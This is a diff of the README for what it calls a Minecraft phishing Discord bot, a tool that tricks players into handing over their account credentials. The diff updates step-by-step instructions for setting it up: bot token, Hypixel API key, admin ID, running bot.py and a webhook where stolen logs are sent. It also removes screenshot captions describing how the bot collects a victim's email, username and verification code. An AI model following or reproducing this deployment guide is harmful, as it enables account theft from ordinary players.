@@ -8,26 +8,17 @@ A Minecraft phishing Discord bot is a malicious program designed to deceive play
 ## How to run
   (Python Download- https://www.python.org/downloads/release/python-31012/)  
   1.Make your bot token and give it ALL intents  
-  2.Put the token in config.py  
-  3.Put your discord id in self.admins = [YOUR DISCORD ID]  
-  4.Open CMD in the folder and type pip install -r requirements.txt  
-  5.Once that's finished run in cmd, python bot.py  
-  6.Then in your server type !sync global  
-  7.After that do /webhook and enter where you want your logs to go
+  2.Go to https://developer.hypixel.net/dashboard and copy your API key
+  3.Put the token and api key in config.py  
+  4.Put your discord id in self.admins = [YOUR DISCORD ID]  
+  5.Open CMD in the folder and type pip install -r requirements.txt  
+  6.Once that's finished run in cmd, python bot.py  
+  7.Then in your server type !sync global  
+  8.After that do /webhook and enter where you want your logs to go
 
 
 # What it looks like:
 
-## **How the modal looks when set up properly (Example):**   
-
-![Gets Email+Username](https://cdn.discordapp.com/attachments/1027246555683631195/1126907278080090124/image.png)  
-![Sends Private Message In Channel Asking For Code](https://cdn.discordapp.com/attachments/1027246555683631195/1126907329145753672/image.png)  
-![Gets Code](https://cdn.discordapp.com/attachments/1027246555683631195/1126907359529283685/image.png)  
-![Sends any message after you want](https://cdn.discordapp.com/attachments/1027246555683631195/1126907510423556240/image.png)  
-
-
-## **How the logs come through:**   
-
-![How the logs come through](https://cdn.discordapp.com/attachments/1015244668163858452/1127213558510395453/image.png)
+[Ill Update This Later]
 
 
